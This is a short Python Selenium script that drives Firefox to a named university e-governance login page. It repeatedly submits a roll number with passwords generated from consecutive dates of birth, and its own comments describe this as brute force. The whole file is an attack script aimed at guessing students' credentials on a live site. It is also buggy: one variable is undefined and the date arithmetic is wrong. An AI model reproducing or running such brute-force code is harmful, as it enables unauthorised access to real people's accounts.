from selenium import webdriver
from selenium.webdriver.common.keys import Keys


import time



    
browser = webdriver.Firefox()
browser.get('http://egov.uok.edu.in/eConduct/')
def signIn(email,password):
        
        search1=browser.find_element_by_xpath('/html/body/form/div[3]/section[1]/div/table/tbody/tr[1]/td[2]/input')
        search2=browser.find_element_by_xpath('/html/body/form/div[3]/section[1]/div/table/tbody/tr[2]/td[2]/input')  
        button=browser.find_element_by_xpath('/html/body/form/div[3]/section[1]/div/table/tbody/tr[3]/td[2]/input')
        
        #search2=driver.find_element_by_xpath
        #emailInput = self.browser.find_elements_by_css_selector('form input')[0]
        #passwordInput = self.browser.find_elements_by_css_selector('form input')[1]


        #emailInput.send_keys(self.email)
        search1.send_keys(email)
        search2.send_keys(password)
       # time.sleep(3)
        button.send_keys(Keys.ENTER)
        #errormessage=self.browser.find_element_by_xpath('/html/body/form/div[3]/section[2]/div[1]')
        
        #print("error ",errormessage)
       #i am genrating delay because on 2g network it takes time for browser
	#so added 6 sec before calling signIn() again
        time.sleep(6)


day=19
month=4
year=1990
i=0
j=0
while True:
    roll=int_number_pass
    
    #here i am checking sequences of dob incrementing year,month,day
	#it acts as brute force
    
    if month<10:
        get_str=str(day)+'0'+str(month)+str(year)
    else:
        get_str=str(day)+str(month)+str(year)
    if i==0:
        print("get str",get_str)
        signIn(roll,get_str)
        i+=1
    else:
        signIn('',get_str)
        print("get str",get_str)
    day=day+1
    
    if day==31:
        month=month+1
        day=1
    if month==12 and day==31:
        year+=1
   
    j=j+1
    if j==20:
        exit()

